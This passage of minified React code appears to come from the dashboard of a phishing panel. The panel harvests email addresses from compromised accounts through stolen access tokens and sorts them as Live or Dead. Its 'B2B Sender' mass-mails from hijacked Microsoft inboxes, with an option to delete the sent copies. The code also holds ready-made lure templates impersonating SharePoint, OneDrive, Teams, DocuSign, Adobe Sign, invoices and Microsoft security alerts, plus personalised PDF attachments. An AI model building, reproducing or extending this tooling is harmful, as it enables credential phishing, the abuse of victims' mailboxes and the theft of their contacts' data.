                                onClick: () => m(`office365`),
                                label: `Office 365`,
                                count: pe.office365 || 0,
                                color: `text-blue-400`,
                              }),
                            (pe.gsuite || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `gsuite`,
                                onClick: () => m(`gsuite`),
                                label: `Google WS`,
                                count: pe.gsuite || 0,
                                color: `text-green-400`,
                              }),
                            (pe.godaddy || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `godaddy`,
                                onClick: () => m(`godaddy`),
                                label: `GoDaddy`,
                                count: pe.godaddy || 0,
                                color: `text-orange-400`,
                              }),
                            (pe.gateway || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `gateway`,
                                onClick: () => m(`gateway`),
                                label: `Gateway`,
                                count: pe.gateway || 0,
                                color: `text-yellow-400`,
                              }),
                            (pe.other || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `other`,
                                onClick: () => m(`other`),
                                label: `Other`,
                                count: pe.other || 0,
                                color: `text-neutral-400`,
                              }),
                            (pe.consumer || 0) > 0 &&
                              (0, R.jsx)(Ss, {
                                active: p === `consumer`,
                                onClick: () => m(`consumer`),
                                label: `Consumer`,
                                count: pe.consumer || 0,
                                color: `text-neutral-500`,
                              }),
                          ],
                        }),
                      N &&
                        (0, R.jsxs)(R.Fragment, {
                          children: [
                            (0, R.jsx)(Ss, {
                              active: p === `valid`,
                              onClick: () => m(`valid`),
                              label: `Valid`,
                              count: me,
                              color: `text-emerald-400`,
                            }),
                            (0, R.jsx)(Ss, {
                              active: p === `invalid`,
                              onClick: () => m(`invalid`),
                              label: `Invalid`,
                              count: he,
                              color: `text-red-400`,
                            }),
                          ],
                        }),
                    ],
                  }),
                (0, R.jsxs)(`div`, {
                  className: `flex items-center gap-2 mb-3`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `flex-1 relative`,
                      children: [
                        (0, R.jsx)(xi, {
                          size: 14,
                          className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
                        }),
                        (0, R.jsx)(`input`, {
                          type: `text`,
                          value: s,
                          onChange: (e) => c(e.target.value),
                          placeholder: `Filter emails...`,
                          className: `w-full bg-bg border border-border text-text pl-9 pr-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                        }),
                      ],
                    }),
                    (0, R.jsx)(V, {
                      variant: `secondary`,
                      size: `sm`,
                      onClick: _e,
                      children: (0, R.jsxs)(`span`, {
                        className: `flex items-center gap-1.5`,
                        children: [
                          l
                            ? (0, R.jsx)(jr, { size: 12 })
                            : (0, R.jsx)(Ur, { size: 12 }),
                          ` `,
                          l ? `Copied` : `Copy`,
                        ],
                      }),
                    }),
                    (0, R.jsx)(V, {
                      variant: `secondary`,
                      size: `sm`,
                      onClick: ge,
                      children: (0, R.jsxs)(`span`, {
                        className: `flex items-center gap-1.5`,
                        children: [(0, R.jsx)(Gr, { size: 12 }), ` Export`],
                      }),
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `text-[10px] text-text-muted uppercase tracking-wider mb-2`,
                  children: [
                    fe.length,
                    ` of `,
                    le.length,
                    ` emails`,
                    !ce && ` (live — extraction in progress)`,
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `border border-border overflow-auto max-h-[500px]`,
                  children: [
                    (0, R.jsxs)(`div`, {
                      className: `grid grid-cols-[1fr_110px_80px] gap-2 px-3 py-2 text-[10px] uppercase tracking-wider text-text-muted border-b border-border bg-surface sticky top-0 z-10`,
                      children: [
                        (0, R.jsx)(`span`, { children: `Email` }),
                        (0, R.jsx)(`span`, { children: `Provider` }),
                        (0, R.jsx)(`span`, { children: `Status` }),
                      ],
                    }),
                    (0, R.jsx)(`div`, {
                      className: `divide-y divide-border`,
                      children: fe.slice(0, 1e3).map((e, t) => {
                        let n = ue(e.email),
                          r = C[e.email.toLowerCase()];
                        return (0, R.jsxs)(
                          `div`,
                          {
                            className: `grid grid-cols-[1fr_110px_80px] gap-2 px-3 py-1.5 text-xs hover:bg-surface-hover transition-colors items-center`,
                            children: [
                              (0, R.jsx)(`span`, {
                                className: `font-mono text-text-secondary truncate`,
                                title: e.name || void 0,
                                children: e.email,
                              }),
                              (0, R.jsx)(Cs, { provider: n }),
                              r
                                ? (0, R.jsx)(ws, { result: r })
                                : (0, R.jsx)(`span`, {
                                    className: `text-text-muted text-[10px]`,
                                    children: `—`,
                                  }),
                            ],
                          },
                          t,
                        );
                      }),
                    }),
                    fe.length > 1e3 &&
                      (0, R.jsxs)(`div`, {
                        className: `text-center py-2 text-xs text-text-muted border-t border-border`,
                        children: [
                          `Showing 1,000 of `,
                          fe.length.toLocaleString(),
                          ` — use Export for full list`,
                        ],
                      }),
                  ],
                }),
              ],
            }),
          ce &&
            le.length === 0 &&
            (0, R.jsxs)(`div`, {
              className: `bg-surface border border-border p-5 text-center`,
              children: [
                (0, R.jsx)(L, {
                  size: 28,
                  className: `mx-auto mb-3 text-amber-400 opacity-60`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-sm text-text-secondary mb-2`,
                  children: `Extraction completed with 0 results.`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-xs text-text-muted mb-3`,
                  children: `This usually means the token doesn't have enough permissions to read contacts or mail. The account may have been secured, or it's a new account with no data.`,
                }),
                r?.phase_errors &&
                  r.phase_errors.length > 0 &&
                  (0, R.jsxs)(`div`, {
                    className: `mt-3 text-left bg-bg border border-border p-3 max-w-md mx-auto`,
                    children: [
                      (0, R.jsx)(`div`, {
                        className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                        children: `Errors encountered`,
                      }),
                      r.phase_errors.map((e, t) =>
                        (0, R.jsx)(
                          `div`,
                          {
                            className: `text-[11px] text-red-400 font-mono`,
                            children: e,
                          },
                          t,
                        ),
                      ),
                    ],
                  }),
                (0, R.jsx)(`p`, {
                  className: `text-xs text-text-muted mt-3`,
                  children: `Try a different token with active permissions.`,
                }),
              ],
            }),
          !r &&
            !a &&
            (0, R.jsx)(Ts, {
              text: `Click 'Start Extraction' to scan the account for email addresses.`,
            }),
        ],
      });
}
function Ss({ active: e, onClick: t, label: n, count: r, color: i }) {
  return (0, R.jsxs)(`button`, {
    onClick: t,
    className: `flex items-center gap-1.5 px-3 py-1.5 text-xs border transition-colors cursor-pointer ${e ? `bg-slate-800 border-slate-700 text-white` : `bg-transparent border-border text-text-muted hover:border-border-light hover:text-text-secondary`}`,
    children: [
      (0, R.jsx)(`span`, {
        className: e ? `text-white` : i || `text-text-muted`,
        children: n,
      }),
      (0, R.jsx)(`span`, {
        className: `text-[10px] ${e ? `text-white/70` : `text-text-muted`}`,
        children: r.toLocaleString(),
      }),
    ],
  });
}
function Cs({ provider: e }) {
  let t = vs[e] || vs.unknown;
  return (0, R.jsx)(`span`, {
    className: `text-[10px] px-1.5 py-0.5 ${t.bg} ${t.color} border ${t.border} truncate`,
    children: t.label,
  });
}
function ws({ result: e }) {
  return e.valid === !0
    ? (0, R.jsxs)(`span`, {
        className: `flex items-center gap-1 text-[10px] text-emerald-400`,
        children: [(0, R.jsx)(jr, { size: 10 }), ` Live`],
      })
    : e.valid === !1
      ? (0, R.jsxs)(`span`, {
          className: `flex items-center gap-1 text-[10px] text-red-400`,
          children: [(0, R.jsx)(Rr, { size: 10 }), ` Dead`],
        })
      : (0, R.jsxs)(`span`, {
          className: `flex items-center gap-1 text-[10px] text-yellow-500`,
          children: [(0, R.jsx)(L, { size: 10 }), ` N/A`],
        });
}
function Ts({ text: e }) {
  return (0, R.jsxs)(`div`, {
    className: `flex flex-col items-center justify-center py-16 text-text-muted`,
    children: [
      (0, R.jsx)(Er, { size: 32, className: `mb-3 opacity-30` }),
      (0, R.jsx)(`p`, { className: `text-sm`, children: e }),
    ],
  });
}
function Es({ text: e }) {
  return (0, R.jsxs)(`div`, {
    className: `flex items-center justify-center py-16 gap-2 text-text-muted`,
    children: [
      (0, R.jsx)(ci, { size: 14, className: `animate-spin` }),
      (0, R.jsx)(`span`, { className: `text-sm`, children: e }),
    ],
  });
}
async function Ds(e, t) {
  return P(`/dash/inbox/${e}/send-job`, {
    method: `POST`,
    body: JSON.stringify(t),
  });
}
async function Os() {
  return P(`/dash/send-jobs`);
}
async function ks(e) {
  return P(`/dash/send-jobs/${e}`);
}
async function As(e) {
  return P(`/dash/send-jobs/${e}/cancel`, { method: `POST` });
}
async function js(e) {
  return P(`/dash/send-jobs/${e}/delete`, { method: `POST` });
}
async function Ms(e) {
  return P(`/dash/send-jobs/${e}/pause`, { method: `POST` });
}
async function Ns(e) {
  return P(`/dash/send-jobs/${e}/resume`, { method: `POST` });
}
async function Ps(e) {
  return P(`/dash/send-jobs/${e}/live`);
}
async function Fs(e) {
  return P(`/dash/ai-template`, { method: `POST`, body: JSON.stringify(e) });
}
async function Is(e, t) {
  return P(`/dash/html-to-pdf`, {
    method: `POST`,
    body: JSON.stringify({ html: e, filename: t || `document.pdf` }),
  });
}
var Ls = [
  {
    id: `ms-sharepoint`,
    name: `SharePoint — Document Shared`,
    subject: `{{sender_name}} shared a file with you`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#616161;margin:0 0 4px;letter-spacing:0.2px;">SharePoint Online</p>
<p style="font-size:20px;color:#242424;margin:0 0 20px;font-weight:600;line-height:1.35;">{{sender_name}} shared a file with you</p>
<p style="font-size:14px;color:#424242;margin:0 0 18px;line-height:1.55;">Hi [[name]], a document has been shared with you from the [[company]] team site. Please open it at your earliest convenience.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f5f5f5;margin:0 0 22px;"><tr>
<td style="padding:14px 16px;vertical-align:middle;width:44px;"><table cellpadding="0" cellspacing="0"><tr><td style="width:40px;height:48px;background:#e0e0e0;text-align:center;vertical-align:middle;font-size:10px;font-weight:700;color:#757575;">DOC</td></tr></table></td>
<td style="padding:14px 16px 14px 4px;vertical-align:middle;"><span style="font-size:14px;font-weight:600;color:#242424;display:block;">Shared Document</span><span style="font-size:12px;color:#757575;">[[date]]</span></td>
</tr></table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 18px;"><tr><td style="background:#0f6cbd;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Open</a></td></tr></table>
</td></tr><tr><td style="padding:18px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;line-height:1.45;">This message was sent to [[email]] because {{sender_name}} shared content with you.</p>
</td></tr></table>`,
  },
  {
    id: `ms-onedrive`,
    name: `OneDrive — File Shared`,
    subject: `{{sender_name}} shared "Document" with you`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#616161;margin:0 0 4px;">OneDrive</p>
<p style="font-size:18px;color:#242424;margin:0 0 18px;font-weight:600;">{{sender_name}} shared a file with you</p>
<p style="font-size:14px;color:#424242;margin:0 0 16px;line-height:1.55;">[[name]], you have a new file shared to your [[company]] account. Select the link below to view it.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;margin:0 0 22px;"><tr>
<td style="padding:14px 16px;vertical-align:middle;">
<span style="font-size:14px;font-weight:600;color:#242424;display:block;">[[company]] - Shared File</span>
<span style="font-size:12px;color:#757575;">Shared on [[date]] with [[email]]</span>
</td></tr></table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#0f6cbd;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Open</a></td></tr></table>
<p style="font-size:12px;color:#a0a0a0;margin:0 0 8px;">This link is accessible only to [[email]].</p>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">Microsoft Corporation, One Microsoft Way, Redmond WA 98052</p>
</td></tr></table>`,
  },
  {
    id: `ms-teams`,
    name: `Teams — New Message`,
    subject: `{{sender_name}} sent a message in [[company]]`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#616161;margin:0 0 4px;">Microsoft Teams</p>
<p style="font-size:18px;color:#242424;margin:0 0 18px;font-weight:600;">New activity in [[company]]</p>
<p style="font-size:14px;color:#424242;margin:0 0 6px;line-height:1.55;"><strong>{{sender_name}}</strong> sent a message in <strong>General</strong>:</p>
<table width="100%" cellpadding="0" cellspacing="0" style="margin:12px 0 22px;"><tr>
<td style="border-left:3px solid #5b5fc7;padding:10px 16px;background:#f8f8fc;">
<p style="font-size:14px;color:#424242;margin:0;line-height:1.5;">Hi [[name]], please take a look at the shared document and provide your feedback when you get a chance.</p>
</td></tr></table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#5b5fc7;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Open in Teams</a></td></tr></table>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">Sent to [[email]]. Microsoft Corporation</p>
</td></tr></table>`,
  },
  {
    id: `ms-outlook`,
    name: `Microsoft 365 — Voicemail`,
    subject: `Voicemail from {{sender_name}} - [[date]]`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#616161;margin:0 0 4px;">Microsoft 365</p>
<p style="font-size:18px;color:#242424;margin:0 0 18px;font-weight:600;">You have a new voicemail</p>
<p style="font-size:14px;color:#424242;margin:0 0 16px;line-height:1.55;">Hi [[name]], you received a voicemail message.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;margin:0 0 22px;">
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;background:#fafafa;">From</td><td style="padding:10px 16px;font-size:13px;color:#242424;background:#fafafa;font-weight:600;">{{sender_name}}</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;border-top:1px solid #e8e8e8;">To</td><td style="padding:10px 16px;font-size:13px;color:#242424;border-top:1px solid #e8e8e8;">[[email]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;background:#fafafa;border-top:1px solid #e8e8e8;">Date</td><td style="padding:10px 16px;font-size:13px;color:#242424;background:#fafafa;border-top:1px solid #e8e8e8;">[[date]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;border-top:1px solid #e8e8e8;">Duration</td><td style="padding:10px 16px;font-size:13px;color:#242424;border-top:1px solid #e8e8e8;">0:38</td></tr>
</table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#0f6cbd;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Play Voicemail</a></td></tr></table>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">Microsoft Corporation, One Microsoft Way, Redmond WA 98052</p>
</td></tr></table>`,
  },
  {
    id: `docusign`,
    name: `DocuSign — Signature Required`,
    subject: `{{sender_name}} requested your signature`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:Helvetica,Arial,sans-serif;border-top:4px solid #dbb23e;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:20px;color:#333333;margin:0 0 8px;font-weight:700;">Review and sign your document</p>
<p style="font-size:14px;color:#666666;margin:0 0 22px;line-height:1.55;">{{sender_name}} sent you a document to review and sign.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;margin:0 0 22px;">
<tr><td style="padding:10px 16px;font-size:13px;color:#666666;background:#fafafa;">Recipient</td><td style="padding:10px 16px;font-size:13px;color:#333333;background:#fafafa;">[[name]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#666666;border-top:1px solid #e8e8e8;">Email</td><td style="padding:10px 16px;font-size:13px;color:#333333;border-top:1px solid #e8e8e8;">[[email]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#666666;background:#fafafa;border-top:1px solid #e8e8e8;">Sent</td><td style="padding:10px 16px;font-size:13px;color:#333333;background:#fafafa;border-top:1px solid #e8e8e8;">[[date]]</td></tr>
</table>
<table cellpadding="0" cellspacing="0" width="100%"><tr><td align="center" style="background:#dbb23e;padding:13px 28px;"><a href="[[link]]" style="color:#333333;text-decoration:none;font-size:15px;font-weight:700;">REVIEW DOCUMENT</a></td></tr></table>
<p style="font-size:12px;color:#999999;margin:18px 0 0;line-height:1.5;">This email contains a secure link to your document. Do not forward this email.</p>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #e8e8e8;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">DocuSign Inc, 221 Main St, Suite 1550, San Francisco CA 94105</p>
</td></tr></table>`,
  },
  {
    id: `invoice`,
    name: `Invoice Notification`,
    subject: `Invoice #INV-[[date]] for [[company]]`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:20px;color:#242424;margin:0 0 6px;font-weight:700;">Invoice</p>
<p style="font-size:13px;color:#757575;margin:0 0 22px;">From {{sender_name}}</p>
<p style="font-size:14px;color:#424242;margin:0 0 16px;line-height:1.55;">Dear [[name]], please find your invoice details below.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e0e0e0;margin:0 0 22px;">
<tr style="background:#f5f5f5;"><td style="padding:10px 16px;font-size:13px;font-weight:600;color:#424242;">Billed To</td><td style="padding:10px 16px;font-size:13px;color:#424242;">[[name]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;font-weight:600;color:#424242;border-top:1px solid #e0e0e0;">Company</td><td style="padding:10px 16px;font-size:13px;color:#424242;border-top:1px solid #e0e0e0;">[[company]]</td></tr>
<tr style="background:#f5f5f5;"><td style="padding:10px 16px;font-size:13px;font-weight:600;color:#424242;border-top:1px solid #e0e0e0;">Due Date</td><td style="padding:10px 16px;font-size:13px;color:#424242;border-top:1px solid #e0e0e0;">[[date]]</td></tr>
</table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#2e2e3e;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">View Invoice</a></td></tr></table>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">This is an automated notification sent to [[email]].</p>
</td></tr></table>`,
  },
  {
    id: `adobe-sign`,
    name: `Adobe Acrobat Sign — Agreement`,
    subject: `Action required: [[company]] agreement from {{sender_name}}`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:Helvetica,Arial,sans-serif;border-top:4px solid #eb1000;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#757575;margin:0 0 4px;">Adobe Acrobat Sign</p>
<p style="font-size:18px;color:#333333;margin:0 0 18px;font-weight:600;">Agreement waiting for your signature</p>
<p style="font-size:14px;color:#444444;margin:0 0 16px;line-height:1.55;">Hi [[name]], {{sender_name}} has sent you a document for [[company]] that requires your electronic signature.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f8f8f8;border:1px solid #e8e8e8;margin:0 0 22px;">
<tr><td style="padding:14px 16px;">
<span style="font-size:14px;font-weight:600;color:#333333;display:block;">[[company]] Agreement</span>
<span style="font-size:12px;color:#757575;">Sent to [[email]] on [[date]]</span>
</td></tr></table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#1473e6;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Review and Sign</a></td></tr></table>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #e8e8e8;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">Sent via Adobe Acrobat Sign to [[email]] on behalf of {{sender_name}}.</p>
</td></tr></table>`,
  },
  {
    id: `password-reset`,
    name: `Account Security Notification`,
    subject: `Account notification for [[email]]`,
    body: `<table width="100%" cellpadding="0" cellspacing="0" style="max-width:580px;margin:0 auto;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;"><tr><td style="padding:28px 32px 0;background:#ffffff;">
<p style="font-size:13px;color:#616161;margin:0 0 4px;">Microsoft Account</p>
<p style="font-size:18px;color:#242424;margin:0 0 18px;font-weight:600;">Recent activity on your account</p>
<p style="font-size:14px;color:#424242;margin:0 0 16px;line-height:1.55;">Hi [[name]], we noticed new activity on your Microsoft account. Please review the details below and verify this was you.</p>
<table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;margin:0 0 22px;">
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;background:#fafafa;">Account</td><td style="padding:10px 16px;font-size:13px;color:#242424;background:#fafafa;">[[email]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;border-top:1px solid #e8e8e8;">Organization</td><td style="padding:10px 16px;font-size:13px;color:#242424;border-top:1px solid #e8e8e8;">[[company]]</td></tr>
<tr><td style="padding:10px 16px;font-size:13px;color:#616161;background:#fafafa;border-top:1px solid #e8e8e8;">Date</td><td style="padding:10px 16px;font-size:13px;color:#242424;background:#fafafa;border-top:1px solid #e8e8e8;">[[date]]</td></tr>
</table>
<table cellpadding="0" cellspacing="0" style="margin:0 0 16px;"><tr><td style="background:#0f6cbd;padding:10px 28px;"><a href="[[link]]" style="color:#ffffff;text-decoration:none;font-size:14px;font-weight:600;">Review Activity</a></td></tr></table>
<p style="font-size:12px;color:#a0a0a0;margin:0 0 8px;">If you recognize this activity, no action is needed.</p>
</td></tr><tr><td style="padding:16px 32px;border-top:1px solid #edebe9;">
<p style="font-size:11px;color:#a0a0a0;margin:0;">Sent to [[email]]. Microsoft Corporation, One Microsoft Way, Redmond WA 98052</p>
</td></tr></table>`,
  },
];
function Rs() {
  let [e, t] = (0, _.useState)(`compose`);
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`h1`, {
        className: `text-lg font-bold tracking-wider uppercase mb-6`,
        children: `B2B Sender`,
      }),
      (0, R.jsxs)(`div`, {
        className: `flex gap-1 mb-4 border-b border-border`,
        children: [
          (0, R.jsx)(Gs, {
            active: e === `compose`,
            onClick: () => t(`compose`),
            children: `Compose`,
          }),
          (0, R.jsx)(Gs, {
            active: e === `jobs`,
            onClick: () => t(`jobs`),
            children: `Send Jobs`,
          }),
        ],
      }),
      e === `compose` ? (0, R.jsx)(zs, {}) : (0, R.jsx)(Bs, {}),
    ],
  });
}
function zs() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(null),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(``),
    [u, d] = (0, _.useState)(2),
    [f, p] = (0, _.useState)(`normal`),
    [m, h] = (0, _.useState)(!1),
    [g, v] = (0, _.useState)(``),
    [y, b] = (0, _.useState)(!1),
    [x, S] = (0, _.useState)(!1),
    [C, w] = (0, _.useState)(!1),
    [ee, T] = (0, _.useState)(!1),
    [E, D] = (0, _.useState)(``),
    [te, ne] = (0, _.useState)(``),
    [O, re] = (0, _.useState)(``),
    [k, ie] = (0, _.useState)(`visual`),
    [ae, A] = (0, _.useState)([]),
    [j, oe] = (0, _.useState)(!1),
    se = (0, _.useRef)(null),
    ce = (0, _.useRef)(null),
    le = (0, _.useRef)(null),
    M = z((e) => e.add);
  (0, _.useEffect)(() => {
    Wa()
      .then((e) => {
        let n = e.filter(
          (e) =>
            e.status === `active` &&
            e.client_id?.toLowerCase().startsWith(`d3590ed6`),
        );
        (t(n), n.length > 0 && r(n[0].id));
      })
      .catch(() => M(`Failed to load tokens`, `error`));
  }, []);
  let N = i
      .split(/[,\r\n]+/)
      .map((e) => e.trim())
      .filter((e) => e && e.includes(`@`)),
    ue = g
      .split(/[,\r\n]+/)
      .map((e) => e.trim())
      .filter((e) => e && e.includes(`@`));
  function de(e) {
    let t = e.target.files?.[0];
    if (!t) return;
    let n = new FileReader();
    ((n.onload = (e) => {
      let t = e.target?.result;
      if (t) {
        let e = i.trim();
        (a(
          e
            ? e +
                `
` +
                t
            : t,
        ),
          M(
            `Loaded ${t.split(/[,\n]/).filter((e) => e.trim()).length} lines from file`,
            `success`,
          ));
      }
    }),
      n.readAsText(t),
      (e.target.value = ``));
  }
  let fe = (0, _.useCallback)(() => {
      let e = le.current?.contentDocument;
      if (e?.body) {
        let t = e.body.innerHTML;
        t !== c && l(t);
      }
    }, [c]),
    pe = (0, _.useCallback)(
      (e) => {
        let t = le.current;
        if (!t) return;
        let n = t.contentDocument;
        n &&
          (n.open(),
          n.write(
            `<!DOCTYPE html><html><head><meta charset="utf-8"><style>body{font-family:'Segoe UI',Helvetica,Arial,sans-serif;font-size:14px;color:#333;margin:8px;}</style></head><body contenteditable="true">${e}</body></html>`,
          ),
          n.close(),
          n.body?.addEventListener(`input`, fe));
      },
      [fe],
    );
  (0, _.useEffect)(() => {
    if (k === `visual`) {
      let e = setTimeout(() => pe(c), 50);
      return () => clearTimeout(e);
    }
  }, [k]);
  function me(e) {
    let t = e.target.files;
    if (!t) return;
    let n = ae.reduce((e, t) => e + t.size, 0);
    (Array.from(t).forEach((e) => {
      if (n + e.size > 35 * 1024 * 1024) {
        M(`Total attachments exceed 35MB limit`, `error`);
        return;
      }
      let t = new FileReader();
      ((t.onload = (t) => {
        let n = (t.target?.result).split(`,`)[1];
        n &&
          A((t) => [
            ...t,
            {
              name: e.name,
              contentType: e.type || `application/octet-stream`,
              contentBytes: n,
              size: e.size,
            },
          ]);
      }),
        t.readAsDataURL(e));
    }),
      (e.target.value = ``));
  }
  function he(e) {
    A((t) => t.filter((t, n) => n !== e));
  }
  async function ge() {
    if (!c.trim()) {
      M(`Write email body first`, `error`);
      return;
    }
    oe(!0);
    try {
      let e = await Is(ve(c, N[0] || `john.smith@example.com`), `document.pdf`);
      A((t) => [
        ...t,
        {
          name: e.filename || `document.pdf`,
          contentType: e.contentType,
          contentBytes: e.contentBytes,
          size: e.size,
          _pdfFromBody: !0,
        },
      ]);
      let t = new Blob(
          [Uint8Array.from(atob(e.contentBytes), (e) => e.charCodeAt(0))],
          { type: `application/pdf` },
        ),
        n = URL.createObjectURL(t),
        r = document.createElement(`a`);
      ((r.href = n),
        (r.download = e.filename || `document.pdf`),
        r.click(),
        URL.revokeObjectURL(n),
        M(`PDF generated, attached & downloaded`, `success`));
    } catch (e) {
      M(e.message || `PDF conversion failed`, `error`);
    } finally {
      oe(!1);
    }
  }
  function _e(e) {
    if ((re(e), !e)) return;
    let t = Ls.find((t) => t.id === e);
    t &&
      (s(t.subject),
      l(t.body),
      k === `visual` && setTimeout(() => pe(t.body), 60),
      M(`Template "${t.name}" applied`, `success`));
  }
  function ve(e, t) {
    let n = e;
    (E && (n = n.replace(/\[\[link\]\]/g, E)),
      te && (n = n.replace(/\{\{sender_name\}\}/g, te)));
    let r = new Date().toLocaleDateString(`en-GB`, {
      day: `numeric`,
      month: `long`,
      year: `numeric`,
    });
    if (((n = n.replace(/\[\[date\]\]/g, r)), t)) {
      let e = t.split(`@`)[0] || t,
        r = t.split(`@`)[1] || ``,
        i = r.split(`.`)[0]
          ? r.split(`.`)[0].charAt(0).toUpperCase() + r.split(`.`)[0].slice(1)
          : ``,
        a = e
          .replace(/[._-]/g, ` `)
          .split(` `)
          .map((e) => e.charAt(0).toUpperCase() + e.slice(1))
          .join(` `);
      ((n = n.replace(/\[\[email\]\]/g, t)),
        (n = n.replace(/\[\[name\]\]/g, a)),
        (n = n.replace(/\[\[company\]\]/g, i)));
    }
    return ((n = n.replace(/\{\{\w+\}\}/g, ``)), n);
  }
  async function ye() {
    if (!n) {
      M(`Select a token first`, `error`);
      return;
    }
    if (N.length === 0) {
      M(`Add at least one recipient`, `error`);
      return;
    }
    if (!o.trim()) {
      M(`Subject is required`, `error`);
      return;
    }
    if (!c.trim()) {
      M(`Email body is required`, `error`);
      return;
    }
    (k === `visual` && fe(), S(!0));
    try {
      let e = ae.map((e) =>
          e._pdfFromBody
            ? {
                name: e.name,
                contentType: e.contentType,
                contentBytes: e.contentBytes,
                size: e.size,
                personalize_pdf: !0,
                pdf_html_template: c,
              }
            : e,
        ),
        t = await Ds(n, {
          recipients: N,
          subject: ve(o),
          body: ve(c),
          bodyType: `HTML`,
          delay: u,
          importance: f,
          delete_sent: m,
          attachments: e.length > 0 ? e : void 0,
          bcc: ue.length > 0 ? ue : void 0,
        });
      (M(
        `Job created — ${t.total} emails, ~${t.estimated_minutes} min`,
        `success`,
      ),
        a(``),
        v(``),
        b(!1),
        s(``),
        l(``));
    } catch (e) {
      M(e.message || `Failed to create send job`, `error`);
    } finally {
      S(!1);
    }
  }
  return (0, R.jsxs)(`div`, {
    className: `grid grid-cols-1 lg:grid-cols-3 gap-4`,
    children: [
      (0, R.jsxs)(`div`, {
